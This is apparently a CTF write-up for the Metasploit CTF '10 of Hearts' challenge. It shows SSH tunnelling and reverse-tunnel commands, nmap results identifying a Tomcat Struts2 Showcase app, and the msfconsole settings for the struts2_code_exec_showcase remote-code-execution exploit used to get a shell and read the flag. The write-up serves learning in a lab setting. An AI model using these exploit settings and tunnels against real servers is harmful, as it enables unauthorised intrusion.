# 10 of Hearts - port 8080

No nice images unfortunately, but I was using this command so that I could view the webpage in my own browser:

`ssh ec2-user@52.91.216.20 -i metasploit_ctf_kali_ssh_key.pem -L 8080:172.16.4.85:8080`

There are many varations on that with other tools like `sshuttle`.

`sshuttle -ve "ssh -i metasploit_ctf_kali_ssh_key.pem" -r ec2-user@[redacted] --disable-ipv6 172.16.0.224/28; pfctl -f /etc/pf.conf
autossh -M 2222 -i metasploit_ctf_kali_ssh_key.pem -R :443:127.0.0.1:4444 root@[redacted]`

Nmap showed some information on the application.

```
Apache Tomcat/7.0.84
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
| http-title: Struts2 Showcase
|_Requested resource was showcase.action
```

Searching exploits in the Kali msfconsole we find an exploit to use. I remember having problems getting the default payload to work, but switching to the generic one allowed me arbitrary code execution. I sent a `nc` shell to myself using this.

```
use exploit/multi/http/struts2_code_exec_showcase
set targeturi /integration/saveGangster.action
set payload cmd/unix/generic
set cmd ls /usr/bin
/usr/local/tomcat/tmp/10_of_hearts
```

Once we had a shell on the box the flag could be found in the web directory `/usr/local/tomcat/tmp/10_of_hearts`.

![10 of hearts](10_of_hearts.png)